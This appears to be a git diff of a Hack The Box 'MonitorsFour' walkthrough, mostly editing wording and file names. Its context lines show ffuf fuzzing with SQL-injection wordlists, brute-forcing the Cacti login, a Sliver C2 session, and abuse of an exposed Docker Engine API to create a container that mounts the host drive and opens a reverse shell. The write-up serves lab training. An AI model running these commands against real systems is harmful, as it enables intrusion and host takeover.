@@ -158,7 +158,7 @@ cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 565
 
 ![Password Reset message](./3.png)
 
-- I also tried to provide my ip address as the domain part of the email address to see if I get some connect back from the server. I set up a netcat listener on my attacker machine on port 25 to listen for traffic. But got nothing.
+- The domain part of the email address was also replaced with my IP address to see if I get some connect back from the server. I set up a netcat listener on my attacker machine on port 25 to listen for traffic. But got nothing.
 
 
 ## Testing Password Reset (Host Header injection)
@@ -283,7 +283,7 @@ forgot_password.php     [Status: 200, Size: 3099, Words: 164, Lines: 84, Duratio
 
 ### `/api/v2` and other api versions
 
-- Since there was a `/api/v1` endpoint on the target, I assumed there could be other versions
+- Since there was an `/api/v1` endpoint on the target, I assumed there could be other versions
   of the api, like `/api/v2`, `/api/v3`, ... etc.
 - To verify this assumption I bruteforced for other api versions, and actions using the following command.
   The command lets you use multiple wordlists with `ffuf`.
@@ -479,7 +479,7 @@ ffuf -u http://monitorsfour.htb/api/v1/users?token=FUZZ -w /opt/SecLists-master/
 
 - The parameter `-ac` above does automatic calibration/filtering, but to be more explicit, we can use the `-fr` option,
   which does filtering by regular expression.
-- What we want to filter out of the requests are instances in which there's the phrase `Invalid or missing token`.
+- What we want to filter out of the requests are instances in which we get responses with the phrase `Invalid or missing token`.
 
 ```sh
 /tools/ffuf/ffuf -u 'http://monitorsfour.htb/api/v1/users?token=FUZZ' -w /opt/SecLists-master/Fuzzing/Databases/SQLi/Generic-SQLi.txt:FUZZ  -fr "Invalid or missing token"
@@ -582,7 +582,7 @@ higgins
 ```
 
 - The login form of cacti is protected by a dynamic CSRF token.
-- A bruteforce script with python, requests and beautifulsoup4 which grabbed the crsf token was made
+- A bruteforce script with **python**, **requests** and **beautifulsoup4** which grabbed the crsf token was made
 to automate this action over every element of the wordlist.
 
 ```sh
@@ -810,7 +810,7 @@ $ python3 -m http.server 9001
  64c6149b   http(s)     10.129.3.178:49877   821fbd6a43fa   www-data   linux/amd64        [ALIVE] 
 ```
 
-- Download recursively the source code of the main Monitors app.
+- Download recursively the source code of the main MonitorsFour web app.
 
 ```
 [server] sliver (THIRSTY_MINUTE) > cd /var/www
@@ -839,7 +839,7 @@ dtrwxrwxrwx  www-data:www-data  html  <dir>  Thu Oct 30 08:05:05 +0000 2025
 
 ### `index.php` routes
 
-In `app/index.php`, there were a number of routes registered using the `$router` object, to which controller
+In `app/index.php` of the main app's source code, there were a number of routes registered using the `$router` object, to which controller
 classes were bound.
 
 ```php
@@ -951,6 +951,8 @@ exposed to locally running containers via the configured subnet `192.168.65.7:23
 The IP address `192.168.65.7` is an internal gateway address used by Docker Desktop for communication between
 containers and the underlying Docker Desktop virtual machine.
 
+Shout out to @tameen and @zerokoollabs on hackthebox for their help on this vulnerability.
+
 From prior enumeration of the MonitorsFour main web app, it was found in the changelog that the version of
 Docker Desktop in use by the target is Docker Desktop 4.44.2, which is vulnerable.
 
@@ -1055,7 +1057,7 @@ curl http://192.168.65.7:2375/images/json > /tmp/images.json
   - `alpine:latest`
 
 
-### Build a `containers.json` file
+### Build a `container.json` file
 
 A json file was built to create a container through the API that will mount the host's `C:/` drive
 and connect to our attacker machine through a reverse shell.
@@ -1073,9 +1075,9 @@ This is similar to creating a container through the `docker build` command.
 ```
 
 
-### Execute the `containers.json` file
+### Execute the `container.json` file
 
-- The `containers.json` file was uploaded to the MonitorsFour cacti container
+- The `container.json` file was uploaded to the MonitorsFour cacti container
 
 ```
 [server] sliver (STUPID_CASTANET) > upload ./container.json /tmp/
@@ -1083,7 +1085,7 @@ This is similar to creating a container through the `docker build` command.
 [*] Wrote 1 file successfully to /tmp/container.json
 ```
 
-- Through the exposed Docker Engine API, a container was created from the specifications of the `containers.json` file
+- Through the exposed Docker Engine API, a container was created from the specifications of the `container.json` file
 
 ```sh
 curl -v -H 'Content-Type: application/json' -d @container.json http://192.168.65.7:2375/containers/create > create.json
